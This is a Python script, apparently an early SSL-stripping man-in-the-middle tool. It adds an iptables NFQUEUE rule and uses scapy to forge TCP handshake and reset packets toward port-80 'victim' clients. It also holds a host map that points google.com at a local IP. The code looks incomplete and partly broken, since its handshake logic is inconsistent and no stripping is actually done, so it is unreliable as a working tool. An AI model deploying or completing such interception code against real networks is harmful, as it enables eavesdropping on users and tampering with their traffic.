import os
import logging as log
import re
from scapy.all import IP, TCP, Raw
from scapy.sendrecv import send, sr1
from netfilterqueue import NetfilterQueue


class SslStrip:
	def __init__(self, hostDict, queueNum):
		self.hostDict = hostDict
		self.queueNum = queueNum
		self.queue = NetfilterQueue()

	def __call__(self):
		log.info("Stripping....")
		os.system(
			f'iptables -I INPUT -j NFQUEUE --queue-num {self.queueNum}')
		self.queue.bind(self.queueNum, self.callBack)
		try:
			self.queue.run()
		except KeyboardInterrupt:
			os.system(
				f'iptables -D INPUT -j NFQUEUE --queue-num {self.queueNum}')
			log.info("[!] iptable rule flushed")

	def acceptHandshake(self, packet):
		synAck = IP(src = packet[IP].dst, dst = packet[IP].src) / TCP(sport=80, dport=packet[TCP].sport, flags="SA", seq = 0, ack = packet[TCP].seq + 1)
		ans = sr1(synAck)
		print(ans[TCP].load)
		rst = IP(src = packet[IP].dst, dst = packet[IP].src) / TCP(sport=80, dport=packet[TCP].sport, flags="R", seq = 0, ack = packet[TCP].seq + 1)
		send(rst)

	def callBack(self, packet):		
		scapyPacket = IP(packet.get_payload())	
		if TCP in scapyPacket and scapyPacket[TCP].dport==80:
			if scapyPacket[TCP].flags == "S":
				# Victim wants to connect to us
				self.acceptHandshake(scapyPacket)
			if scapyPacket[TCP].flags == "A":
				ack = IP(src = scapyPacket[IP].dst, dst = scapyPacket[IP].src) / TCP(sport=80, dport=scapyPacket[TCP].sport, flags="SA", seq = 0, ack = scapyPacket[TCP].seq + 1)
				send(ack, verbose=0)				 
		return packet.accept()	


if __name__ == '__main__':
	try:
		hostDict = {
			b"google.com.": "10.0.123.7",
			# b"facebook.com.": "10.0.123.7",
			# b"youtube.com": "10.0.123.7"
		}
		queueNum = 2
		log.basicConfig(format='%(asctime)s - %(message)s', 
						level = log.INFO)
		strip = SslStrip(hostDict, queueNum)
		strip()
	except OSError as error:
		log.error(error)